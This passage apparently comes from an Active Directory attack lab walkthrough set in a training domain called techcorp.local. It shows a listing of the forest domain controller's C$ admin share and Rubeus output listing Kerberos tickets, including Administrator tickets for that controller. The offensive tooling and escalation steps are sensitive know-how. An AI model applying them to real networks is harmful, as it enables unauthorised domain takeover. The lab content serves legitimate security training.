C:\Windows\system32>dir \\techcorp-dc.techcorp.local\C$
 Volume in drive \\techcorp-dc.techcorp.local\C$ has no label.
 Volume Serial Number is 88AD-6C8B

 Directory of \\techcorp-dc.techcorp.local\C$

07/10/2019  08:00 AM    <DIR>          ExchangeSetupLogs
12/07/2020  02:51 AM    <DIR>          PerfLogs
01/06/2021  12:49 AM    <DIR>          Program Files
07/17/2019  10:02 PM    <DIR>          Program Files (x86)
12/26/2022  03:04 AM    <DIR>          Transcripts
07/18/2019  08:48 AM    <DIR>          Users
10/16/2022  03:52 AM    <DIR>          Windows
               0 File(s)              0 bytes
               7 Dir(s)  14,081,155,072 bytes free

```

Validate the tickets (Be carefully with this command!):

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1


Action: Triage Kerberos Tickets (All Users)

[*] Current LUID    : 0xaee71cc

 --------------------------------------------------------------------------------------------------------------------------
 | LUID      | UserName                          | Service                                        | EndTime               |
 --------------------------------------------------------------------------------------------------------------------------
 | 0xaee71cc | Administrator @ us.techcorp.local | CIFS/techcorp-dc.techcorp.local                | 3/4/2023 1:50:21 PM   |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | krbtgt/US.TECHCORP.LOCAL                       | 3/4/2023 3:20:59 AM   |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | ldap/US-DC.us.techcorp.local/US.TECHCORP.LOCAL | 3/4/2023 1:05:59 PM   |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | cifs/US-DC.us.techcorp.local/us.techcorp.local | 3/4/2023 3:20:59 AM   |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | STUDENT17$                                     | 3/4/2023 3:20:59 AM   |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | cifs/us-web                                    | 3/3/2023 5:35:59 PM   |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | cifs/us-dc                                     | 2/28/2023 9:23:15 PM  |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | cifs/us-adconnect                              | 2/28/2023 11:52:20 AM |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | cifs/us-mgmt                                   | 2/20/2023 4:44:14 PM  |
 | 0x3e7     | student17$ @ US.TECHCORP.LOCAL    | ldap/us-dc.us.techcorp.local                   | 2/19/2023 1:44:14 AM  |
 | 0x3e4     | student17$ @ US.TECHCORP.LOCAL    | krbtgt/US.TECHCORP.LOCAL                       | 3/4/2023 9:15:21 AM   |
 | 0x3e4     | student17$ @ US.TECHCORP.LOCAL    | cifs/US-DC.us.techcorp.local                   | 3/4/2023 9:15:21 AM   |
 | 0x3e4     | student17$ @ US.TECHCORP.LOCAL    | LDAP/US-DC.us.techcorp.local                   | 2/19/2023 1:44:14 AM  |
 | 0x3e4     | student17$ @ US.TECHCORP.LOCAL    | GC/Techcorp-DC.techcorp.local/techcorp.local   | 2/19/2023 1:44:14 AM  |
 | 0x3e4     | student17$ @ US.TECHCORP.LOCAL    | ldap/us-dc.us.techcorp.local/us.techcorp.local | 2/19/2023 1:44:14 AM  |
 | 0xaee7226 | Administrator @ US.TECHCORP.LOCAL | krbtgt/US.TECHCORP.LOCAL                       | 3/4/2023 1:25:20 PM   |
 | 0xaee7226 | Administrator @ US.TECHCORP.LOCAL | HTTP/us-dc                                     | 3/4/2023 1:25:20 PM   |
 | 0xaee7226 | Administrator @ US.TECHCORP.LOCAL | cifs/us-dc                                     | 3/4/2023 1:25:20 PM   |
 --------------------------------------------------------------------------------------------------------------------------


```
